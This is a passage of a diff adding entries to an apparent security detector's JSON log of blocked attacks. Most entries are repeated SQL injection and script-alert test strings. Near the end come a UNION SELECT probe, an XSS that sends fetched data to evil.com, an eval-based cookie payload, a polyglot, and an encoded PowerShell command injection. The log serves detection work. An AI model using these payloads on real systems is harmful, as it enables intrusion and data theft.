+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:51.555082+00:00"
+    },
+    {
+      "id": "threat_1762480671_122",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:51.649425+00:00"
+    },
+    {
+      "id": "threat_1762480676_123",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:56.353390+00:00"
+    },
+    {
+      "id": "threat_1762480676_124",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:57:56.606019+00:00"
+    },
+    {
+      "id": "threat_1762480680_125",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:00.342732+00:00"
+    },
+    {
+      "id": "threat_1762480680_126",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:00.436826+00:00"
+    },
+    {
+      "id": "threat_1762480685_127",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:05.550716+00:00"
+    },
+    {
+      "id": "threat_1762480685_128",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:05.637759+00:00"
+    },
+    {
+      "id": "threat_1762480690_129",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:10.847696+00:00"
+    },
+    {
+      "id": "threat_1762480690_130",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:10.921142+00:00"
+    },
+    {
+      "id": "threat_1762480696_131",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:16.346616+00:00"
+    },
+    {
+      "id": "threat_1762480696_132",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:16.432363+00:00"
+    },
+    {
+      "id": "threat_1762480701_133",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:21.978986+00:00"
+    },
+    {
+      "id": "threat_1762480702_134",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:22.072042+00:00"
+    },
+    {
+      "id": "threat_1762480709_135",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:29.110807+00:00"
+    },
+    {
+      "id": "threat_1762480709_136",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:29.389579+00:00"
+    },
+    {
+      "id": "threat_1762480713_137",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:33.740450+00:00"
+    },
+    {
+      "id": "threat_1762480713_138",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:33.824394+00:00"
+    },
+    {
+      "id": "threat_1762480715_139",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:35.174100+00:00"
+    },
+    {
+      "id": "threat_1762480718_140",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:38.032886+00:00"
+    },
+    {
+      "id": "threat_1762480718_141",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:38.121004+00:00"
+    },
+    {
+      "id": "threat_1762480718_142",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:38.206661+00:00"
+    },
+    {
+      "id": "threat_1762480725_143",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:45.818750+00:00"
+    },
+    {
+      "id": "threat_1762480730_144",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:50.260986+00:00"
+    },
+    {
+      "id": "threat_1762480730_145",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:50.636496+00:00"
+    },
+    {
+      "id": "threat_1762480730_146",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:50.717490+00:00"
+    },
+    {
+      "id": "threat_1762480736_147",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:56.882832+00:00"
+    },
+    {
+      "id": "threat_1762480736_148",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:58:56.996065+00:00"
+    },
+    {
+      "id": "threat_1762480743_149",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:03.705285+00:00"
+    },
+    {
+      "id": "threat_1762480743_150",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:03.814564+00:00"
+    },
+    {
+      "id": "threat_1762480750_151",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:10.879376+00:00"
+    },
+    {
+      "id": "threat_1762480750_152",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:10.956167+00:00"
+    },
+    {
+      "id": "threat_1762480758_153",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:18.153574+00:00"
+    },
+    {
+      "id": "threat_1762480758_154",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:18.264948+00:00"
+    },
+    {
+      "id": "threat_1762480765_155",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:25.540466+00:00"
+    },
+    {
+      "id": "threat_1762480765_156",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:25.968997+00:00"
+    },
+    {
+      "id": "threat_1762480767_157",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:27.701928+00:00"
+    },
+    {
+      "id": "threat_1762480767_158",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:27.807284+00:00"
+    },
+    {
+      "id": "threat_1762480772_159",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:32.874056+00:00"
+    },
+    {
+      "id": "threat_1762480774_160",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:34.518306+00:00"
+    },
+    {
+      "id": "threat_1762480774_161",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:34.773236+00:00"
+    },
+    {
+      "id": "threat_1762480779_162",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:39.747826+00:00"
+    },
+    {
+      "id": "threat_1762480779_163",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:39.845934+00:00"
+    },
+    {
+      "id": "threat_1762480780_164",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:40.021508+00:00"
+    },
+    {
+      "id": "threat_1762480790_165",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:50.194141+00:00"
+    },
+    {
+      "id": "threat_1762480790_166",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:50.289591+00:00"
+    },
+    {
+      "id": "threat_1762480797_167",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:57.263228+00:00"
+    },
+    {
+      "id": "threat_1762480797_168",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:59:57.367766+00:00"
+    },
+    {
+      "id": "threat_1762480804_169",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:04.623096+00:00"
+    },
+    {
+      "id": "threat_1762480804_170",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:04.717658+00:00"
+    },
+    {
+      "id": "threat_1762480811_171",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:11.656846+00:00"
+    },
+    {
+      "id": "threat_1762480811_172",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:11.761226+00:00"
+    },
+    {
+      "id": "threat_1762480819_173",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:19.039106+00:00"
+    },
+    {
+      "id": "threat_1762480819_174",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:19.146803+00:00"
+    },
+    {
+      "id": "threat_1762480827_175",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:27.413816+00:00"
+    },
+    {
+      "id": "threat_1762480827_176",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:00:27.971515+00:00"
+    },
+    {
+      "id": "threat_1762481022_177",
+      "payload": "' UNION SELECT @@version, user_name(), db_name() --",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "union select"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:03:42.585707+00:00"
+    },
+    {
+      "id": "threat_1762481022_178",
+      "payload": "<img src=x onerror=fetch('/api/stats').then(r=>r.text()).then(d=>fetch('http://evil.com?data='+btoa(",
+      "result": {
+        "threat": true,
+        "confidence": 0.8,
+        "type": "xss",
+        "severity": "high",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.8,
+            "patterns": [
+              "onerror="
+            ],
+            "severity": "high"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 80
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:03:42.710255+00:00"
+    },
+    {
+      "id": "threat_1762481022_179",
+      "payload": "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.85,
+            "patterns": [
+              "eval("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:03:42.810846+00:00"
+    },
+    {
+      "id": "threat_1762481022_180",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "javascript:",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T02:03:42.898841+00:00"
+    },
+    {
+      "id": "threat_1762481024_181",
+      "payload": "; powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "command_injection",
